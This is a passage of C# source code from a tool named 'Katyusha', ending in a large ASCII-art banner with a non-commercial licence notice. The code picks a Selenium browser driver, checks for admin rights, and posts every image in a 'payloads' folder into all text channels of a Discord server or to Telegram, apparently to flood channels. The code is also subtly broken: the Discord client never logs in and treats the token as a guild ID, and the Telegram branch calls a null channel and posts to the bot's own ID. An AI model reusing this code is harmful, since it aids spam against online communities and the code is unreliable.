        static IWebDriver GetDriver(string browserName)
        {
            switch (browserName.ToLower())
            {
                case "chrome":
                    return new ChromeDriver();
                case "firefox":
                    return new FirefoxDriver();
                case "edge":
                    return new EdgeDriver();
                case "IE":
                    return new InternetExplorerDriver();
                case "safari":
                    return new SafariDriver();
                case "chromium":
                    return new ChromeDriver();
                default:
                    throw new NotSupportedException($" << Katyusha >> [{DateTime.Now.ToString("HH: mm")}] (-) => Inavlid / Unsupported Browser: {browserName}");
            }
        }

        static bool IsAdmin()
        {
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
        }

        private DiscordSocketClient dbot;
        private TelegramBotClient tbot;
        static int botmode;

        public async Task Aldrich_KatyushaInternal(string clienttype, string payloads, string token)
        {
            if (clienttype == "--dd" || clienttype == "-d" || clienttype == "--discord")
            {
                botmode = 1;
                dbot = new DiscordSocketClient();
                var guild = dbot.GetGuild(ulong.Parse(token));
                foreach (var channel in guild.TextChannels)
                {
                    await SendImages_KatyushaInternal(channel, payloads, null);
                }
            }
            else if (clienttype == "--tm" || clienttype == "-t" || clienttype == "--telegram")
            {
                botmode = 2;
                tbot = new TelegramBotClient(token);
                await SendImages_KatyushaInternal(null, payloads, tbot);

            }
            
        }

        private static async Task SendImages_KatyushaInternal(ITextChannel textChannel, string payloads, TelegramBotClient telegram)
        {
            if (botmode == 1)
            {
                var imageFiles = Directory.GetFiles(payloads, "*.png")
                                       .Concat(Directory.GetFiles(payloads, "*.jpg"))
                                       .Concat(Directory.GetFiles(payloads, "*.jpeg"))
                                       .Concat(Directory.GetFiles(payloads, "*.gif"))
                                       .Concat(Directory.GetFiles(payloads, "*.apng"))
                                       .ToArray();

                foreach (var imagePath in imageFiles)
                {
                    using (var stream = new FileStream(imagePath, FileMode.Open))
                    {
                        await textChannel.SendFileAsync(stream, Path.GetFileName(imagePath));
                    }
                }
            }
            else
            {
                var imageFiles = Directory.GetFiles(payloads, "*.png")
                                       .Concat(Directory.GetFiles(payloads, "*.jpg"))
                                       .Concat(Directory.GetFiles(payloads, "*.jpeg"))
                                       .Concat(Directory.GetFiles(payloads, "*.gif"))
                                       .Concat(Directory.GetFiles(payloads, "*.apng"))
                                       .ToArray();

                foreach (var imagePath in imageFiles)
                {
                    using (var stream = new FileStream(imagePath, FileMode.Open))
                    {
                        await textChannel.SendFileAsync(stream, Path.GetFileName(imagePath));
                        await telegram.SendPhotoAsync(telegram.BotId, new InputFileStream(stream, Path.GetFileName(imagePath)));
                    }
                }
            }
            
        }
    }   


}
//
//       ▄▀█ █▀▀ █▀▀ █▀▀ █▀ █▀ █ █▄░█ █▀▀   ▀█▀ █░█ █ █▀   █▀▀ █ █░░ █▀▀   █▄█ █▀█ █░█   ▄▀█ █▀█ █▀▀
//       █▀█ █▄▄ █▄▄ ██▄ ▄█ ▄█ █ █░▀█ █▄█   ░█░ █▀█ █ ▄█   █▀░ █ █▄▄ ██▄   ░█░ █▄█ █▄█   █▀█ █▀▄ ██▄
// 
//                             █▀ █░█ █▄▄ ░░█ █▀▀ █▀▀ ▀█▀   ▀█▀ █▀█
//                             ▄█ █▄█ █▄█ █▄█ ██▄ █▄▄ ░█░   ░█░ █▄█
// 
// ░█████╗░████████╗████████╗██████╗░██╗██████╗░██╗░░░██╗████████╗██╗░█████╗░███╗░░██╗░░░░░░
// ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██║██╔══██╗██║░░░██║╚══██╔══╝██║██╔══██╗████╗░██║░░░░░░
// ███████║░░░██║░░░░░░██║░░░██████╔╝██║██████╦╝██║░░░██║░░░██║░░░██║██║░░██║██╔██╗██║█████╗
// ██╔══██║░░░██║░░░░░░██║░░░██╔══██╗██║██╔══██╗██║░░░██║░░░██║░░░██║██║░░██║██║╚████║╚════╝
// ██║░░██║░░░██║░░░░░░██║░░░██║░░██║██║██████╦╝╚██████╔╝░░░██║░░░██║╚█████╔╝██║░╚███║░░░░░░
// ╚═╝░░╚═╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░╚═╝╚═╝╚═════╝░░╚═════╝░░░░╚═╝░░░╚═╝░╚════╝░╚═╝░░╚══╝░░░░░░
// 
// ███╗░░██╗░█████╗░███╗░░██╗░█████╗░░█████╗░███╗░░░███╗███╗░░░███╗███████╗██████╗░░█████╗░██╗░█████╗░██╗░░░░░
// ████╗░██║██╔══██╗████╗░██║██╔══██╗██╔══██╗████╗░████║████╗░████║██╔════╝██╔══██╗██╔══██╗██║██╔══██╗██║░░░░░
// ██╔██╗██║██║░░██║██╔██╗██║██║░░╚═╝██║░░██║██╔████╔██║██╔████╔██║█████╗░░██████╔╝██║░░╚═╝██║███████║██║░░░░░
// ██║╚████║██║░░██║██║╚████║██║░░██╗██║░░██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝░░██╔══██╗██║░░██╗██║██╔══██║██║░░░░░
// ██║░╚███║╚█████╔╝██║░╚███║╚█████╔╝╚█████╔╝██║░╚═╝░██║██║░╚═╝░██║███████╗██║░░██║╚█████╔╝██║██║░░██║███████╗
// ╚═╝░░╚══╝░╚════╝░╚═╝░░╚══╝░╚════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝░░░░░╚═╝╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝╚═╝░░╚═╝╚══════╝
// 
// ░░██╗██╗░░░░█████╗░
// ░██╔╝██║░░░██╔══██╗
// ██╔╝░██║░░░██║░░██║
// ███████║░░░██║░░██║
// ╚════██║██╗╚█████╔╝
// ░░░░░╚═╝╚═╝░╚════╝░
// 
// ██╗███╗░░██╗████████╗███████╗██████╗░███╗░░██╗░█████╗░████████╗██╗░█████╗░███╗░░██╗░█████╗░██╗░░░░░
// ██║████╗░██║╚══██╔══╝██╔════╝██╔══██╗████╗░██║██╔══██╗╚══██╔══╝██║██╔══██╗████╗░██║██╔══██╗██║░░░░░
// ██║██╔██╗██║░░░██║░░░█████╗░░██████╔╝██╔██╗██║███████║░░░██║░░░██║██║░░██║██╔██╗██║███████║██║░░░░░
// ██║██║╚████║░░░██║░░░██╔══╝░░██╔══██╗██║╚████║██╔══██║░░░██║░░░██║██║░░██║██║╚████║██╔══██║██║░░░░░
// ██║██║░╚███║░░░██║░░░███████╗██║░░██║██║░╚███║██║░░██║░░░██║░░░██║╚█████╔╝██║░╚███║██║░░██║███████╗
// ╚═╝╚═╝░░╚══╝░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝░░░╚═╝░░░╚═╝░╚════╝░╚═╝░░╚══╝╚═╝░░╚═╝╚══════╝
// 
// █─▄▄▄─█─▄▄▄─███▄─▄─▀█▄─█─▄█▀▀▀▀▀██▄─▀█▄─▄█─▄▄▄─███░█░██████─▄▄─█
// █─███▀█─███▀████─▄─▀██▄─▄██████████─█▄▀─██─███▀███▄▄░██░░██─██─█
// ▀▄▄▄▄▄▀▄▄▄▄▄▀▀▀▄▄▄▄▀▀▀▄▄▄▀▀▀▀▀▀▀▀▀▄▄▄▀▀▄▄▀▄▄▄▄▄▀▀▀▀▄▄▄▀▄▄▀▀▄▄▄▄▀
// 
// ▀█▀ █░█ █ █▀   █░░ █ █▀▀ █▀▀ █▄░█ █▀ █▀▀   █▀█ █▀▀ █▀█ █░█ █ █▀█ █▀▀ █▀   ▀█▀ █░█ ▄▀█ ▀█▀
// ░█░ █▀█ █ ▄█   █▄▄ █ █▄▄ ██▄ █░▀█ ▄█ ██▄   █▀▄ ██▄ ▀▀█ █▄█ █ █▀▄ ██▄ ▄█   ░█░ █▀█ █▀█ ░█░
// 
// █▀█ █▀▀ █░█ █▀ █▀▀ █▀█ █▀   █▀▀ █ █░█ █▀▀   █▀▀ █▀█ █▀▀ █▀▄ █ ▀█▀   ▀█▀ █▀█   ▀█▀ █░█ █▀▀
// █▀▄ ██▄ █▄█ ▄█ ██▄ █▀▄ ▄█   █▄█ █ ▀▄▀ ██▄   █▄▄ █▀▄ ██▄ █▄▀ █ ░█░   ░█░ █▄█   ░█░ █▀█ ██▄
// 
// █▀▀ █▀█ █▀▀ ▄▀█ ▀█▀ █▀█ █▀█ ░   █ ▀█▀   ▄▀█ █░░ █░░ █▀█ █░█░█ █▀   █▀█ █▀▀ █░█ █▀ █▀▀ █▀█ █▀   ▀█▀ █▀█
// █▄▄ █▀▄ ██▄ █▀█ ░█░ █▄█ █▀▄ ▄   █ ░█░   █▀█ █▄▄ █▄▄ █▄█ ▀▄▀▄▀ ▄█   █▀▄ ██▄ █▄█ ▄█ ██▄ █▀▄ ▄█   ░█░ █▄█
// 
// █▀▄ █ █▀ ▀█▀ █▀█ █ █▄▄ █░█ ▀█▀ █▀▀ ░   █▀█ █▀▀ █▀▄▀█ █ ▀▄▀ ░   ▄▀█ █▀▄ ▄▀█ █▀█ ▀█▀ ░   ▄▀█ █▄░█ █▀▄
// █▄▀ █ ▄█ ░█░ █▀▄ █ █▄█ █▄█ ░█░ ██▄ █   █▀▄ ██▄ █░▀░█ █ █░█ █   █▀█ █▄▀ █▀█ █▀▀ ░█░ █   █▀█ █░▀█ █▄▀
// 
// █▄▄ █░█ █ █░░ █▀▄   █░█ █▀█ █▀█ █▄░█   ▀█▀ █░█ █▀▀   █▀▄▀█ ▄▀█ ▀█▀ █▀▀ █▀█ █ ▄▀█ █░░   █ █▄░█   ▄▀█ █▄░█ █▄█
// █▄█ █▄█ █ █▄▄ █▄▀   █▄█ █▀▀ █▄█ █░▀█   ░█░ █▀█ ██▄   █░▀░█ █▀█ ░█░ ██▄ █▀▄ █ █▀█ █▄▄   █ █░▀█   █▀█ █░▀█ ░█░
// 
// █▀▄▀█ █▀▀ █▀▄ █ █░█ █▀▄▀█   █▀█ █▀█   █▀▀ █▀█ █▀█ █▀▄▀█ ▄▀█ ▀█▀ ░   █▀▀ █▀█ █▀█
// █░▀░█ ██▄ █▄▀ █ █▄█ █░▀░█   █▄█ █▀▄   █▀░ █▄█ █▀▄ █░▀░█ █▀█ ░█░ █   █▀░ █▄█ █▀▄
// 
// █▄░█ █▀█ █▄░█ █▀▀ █▀█ █▀▄▀█ █▀▄▀█ █▀▀ █▀█ █▀▀ █ ▄▀█ █░░   █▀█ █░█ █▀█ █▀█ █▀█ █▀ █▀▀ █▀   █▀█ █▄░█ █░░ █▄█ ░
// █░▀█ █▄█ █░▀█ █▄▄ █▄█ █░▀░█ █░▀░█ ██▄ █▀▄ █▄▄ █ █▀█ █▄▄   █▀▀ █▄█ █▀▄ █▀▀ █▄█ ▄█ ██▄ ▄█   █▄█ █░▀█ █▄▄ ░█░ ▄
// 
// 
//                                                .                                
//                                             .^~~~^:.                            
//                                         .^~~~!!!!!!~~^^.
//                                     .:^~~!!7!!!!!!!!!!!!~~^:..
//                                  .:~!~~!7!!77!!7!7!!!!!!!!77!~
//                              .:^~!!~~!!!77!!!~~!!!!?77!777!^:.                  
//                          .:^~~~!!?!!777!!~~!!~~777?77!!~^.
//                       .:^!!!!!!!7!77!~!~!7!~777??J777!~^:.                      
//                   .:^~~~~~~!!777!!!~!~!~7?7?777!7?77???JJJ?7~^.
//             :^:::^~!~~~~!!7!!!7!!777!!77??7!!~:.~7!!!!77????J?!^^^^^:..
//         .^7Y55YJ?!!~~!!!!!!~~~~!~7777???!7^.   .!7!!!!!!!?JJ????7JYYYYJ?!^.
//      :!J555Y5YYJJYJ??~~~!!!~!!!77?????7^.^     .!!!!!!!!!?Y?????J?JJJJJJ???^:
//  :!!?YP55YYJJYYYYYYJJJ7?7~777???77?!!~~~^:     .!!777?!!!?YJJYYYYJ?J?????7?7!^
//  .~777!J?JYYYYJJJJY5YYYY55J77!!7~:::..!?7::^^^^^~7JJ??!~!7YYPPPP5JJJJJJJJ?7?!^
//   .^^~!7777J?JYY5YYJY5PPY?7?7!!!~~^^:!77!77!~~!~~!7??J!^!7J5GP55YJ7??~^~7??!:^.
//     .:^^~~!!77?YJY5P5J?JY5Y?!77!!!!~~~~!~!~~~^^^^7JYYYJ!~?Y5YYYJJ?7?!.!Y5YYY7
//       ..:^~~~!7!?5JJJJYYJ?77??!!~!~~^^^^~^..!7^^?5Y?7!JY!JYJJJJJJJ?7^!55JYYY?
//          ...:^~~~!Y5J?~~~77?!~~^^^^~~^^~7777??!!JY7777Y!.:!?7!~^:..  ^Y5JJYJ:
//              .:^!77~:^~^~~~~^~!!77??JJJYYYYYYJ??JYJJJJ^               :!7!^
//                .~~~~^^:^~~~!??JJJJJJJ??7!?JJJYJ!!Y~:.                           
//                   .~!777!7???JJYYJJJ?^^^J5?J!!5J :.
//                     ::.:7???JYYJ??!?57^!5Y77?Y5^
//                         .^!?YJY777!JY: :!JYYJ7:                                 
//                            .^7YYYJY?:     ..
//                               :~~^.
// 
//                          \\ █▄▀ ▄▀█ ▀█▀ █▄█ █ █ █▀ █ █ ▄▀█ //
//                          // █ █ █▀█  █   █  █▄█ ▄█ █▀█ █▀█ \\
//                             GenesisFoundationCore / Katyusha
// 